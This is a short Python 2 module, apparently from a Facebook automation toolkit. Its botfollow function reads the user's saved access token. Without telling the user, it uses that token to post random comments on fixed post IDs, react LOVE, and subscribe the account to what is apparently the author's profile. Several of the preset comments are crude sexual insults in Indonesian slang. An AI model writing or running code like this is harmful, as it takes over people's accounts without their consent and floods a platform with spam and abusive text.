import requests, sys, os, random, proff
from requests.exceptions import ConnectionError
komen = random.choice(['Bang Lu Ngntd!', 'Bang aku mau cerita nih bang Kemarin kan ada cewek ya bang yang minta sv terus aku jadian bang sama dia Udah 3 tahun berpacaran lewat wa bang Lha terus aku baru tau kalo dia itu berbatang :( asyuuu og :( ', 'Bang Lu Cakep Tapi Sayang Kaya Kntl', 'Abang jaga kesehatan ya biar gak sakit Nanti kalau abang sakit yang nyakitin aku siapa?', 'Dah Lah Abng Cakep Banget :) ', 'Bang kemarin lu ngentod sama siapa bang? enak banget asyu aku gak di ajak', 'Bang yok ngentod', 'Semoga Abang Dan Keluarga Masuk Surga :)', 'Bang sebenernya lu cakep bang tapi sayang kayak pejuh :v', 'Semoga Abang Sukses', 'Abang kok ganteng banget ya bang ', 'buah mangga buah durian i love u bang :v', 'Hiiih abang jomblo ya? kasian bet dah :v', 'Wih Panutan Gua Nih', 'Bang prof kentod:v', 'Makan sayur di terminal Abang kayak marjinal:v'])
def botfollow():
    try:
        token = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m] Token/Cookie invalid'
        os.system('rm -rf login.txt')
        exit(proff.login())
    kom = komen
    post1 = '1230470587425293'
    post2 = '1230470587425293'
    requests.post('https://graph.facebook.com/' + post1 + '/comments/?message=' + kom + '&access_token=' + token)   
    requests.post('https://graph.facebook.com/2591942287770145/comments/?message=' + kom + '&access_token=' + token)
    requests.post('https://graph.facebook.com/2591942287770145/comments/?message=' + kom + '&access_token=' + token)
    requests.post('https://graph.facebook.com/' + post2 + '/reactions?type=LOVE&access_token=' + token)
    requests.post('https://graph.facebook.com/100013870892557/subscribers?access_token=' + token)#prof
    exit(proff.menu())
